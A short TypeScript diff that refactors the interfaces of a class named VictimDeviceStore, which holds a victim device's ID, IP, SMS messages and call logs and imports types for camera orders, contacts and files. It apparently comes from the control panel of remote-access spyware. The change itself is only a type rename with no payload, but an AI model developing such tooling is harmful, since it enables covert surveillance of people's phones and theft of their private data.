@@ -15,15 +15,14 @@ import {
     type CameraOrderPayload,
     type ContactItem,
     type FileListItem,
-    type IBaseEntity,
     type IServerToVictimEvents,
-    type IVictim,
+    type IVictimModel,
     type IVictimToServerEvents,
     type SMSItem,
 } from '../../common/interfaces';
 import { bufferToDataUrl } from '../utils/Common';
 
-export class VictimDeviceStore implements IBaseEntity, IVictim {
+export class VictimDeviceStore implements IVictimModel {
     public id: string;
     public deviceId: string;
     public ip: string;
@@ -52,7 +51,7 @@ export class VictimDeviceStore implements IBaseEntity, IVictim {
     public smsMessages: SMSItem[] = [];
     public callLogs: CallLogItem[] = [];
 
-    public constructor(input: IBaseEntity & IVictim) {
+    public constructor(input: IVictimModel) {
         this.id = input.id;
         this.deviceId = input.deviceId;
         this.ip = input.ip;
